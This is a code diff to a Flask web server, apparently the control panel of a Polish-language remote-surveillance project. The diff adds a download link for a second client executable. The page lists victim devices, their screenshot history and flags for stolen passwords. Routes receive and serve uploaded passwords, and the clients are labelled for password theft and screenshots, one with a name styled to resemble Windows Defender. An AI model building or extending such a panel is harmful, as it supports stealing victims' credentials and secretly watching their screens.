@@ -38,12 +38,14 @@ def index():
             device_list.append((u, "🔴", "błąd daty", has_passwords))
 
     content = f"""
-<h1>📦 Pobierz klienta</h1>
-<p><a href="https://github.com/Crazy2515/zdalny-podglad/raw/main/client_download/have_fun_defender.exe" download>
-⬇️ have_fun_defender.exe</a></p>
-<h1>Urządzenia: {len(device_list)}</h1>
-<ul>
-"""
+    <h1>📦 Pobierz klientów</h1>
+    <p><a href="https://github.com/Crazy2515/zdalny-podglad/raw/main/client_download/have_fun_defender.exe" download>
+    ⬇️ have_fun_defender.exe (hasła)</a></p>
+    <p><a href="https://github.com/Crazy2515/zdalny-podglad/raw/main/client_download/client.exe" download>
+    ⬇️ client.exe (screeny)</a></p>
+    <h1>Urządzenia: {len(device_list)}</h1>
+    <ul>
+    """
 
     for u, status, t, has_passwords in device_list:
         content += f'<li>{status} <a href="/view?user={u}">{u}</a> (ostatni screen: {t}) | <a href="/history?user={u}">Historia</a>'
@@ -52,8 +54,6 @@ def index():
         content += '</li>'
     content += "</ul>"
     return content
-
-
 
 @app.route("/upload_passwords", methods=['POST'])
 def upload_passwords():
@@ -91,4 +91,3 @@ def download_passwords(user):
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
-
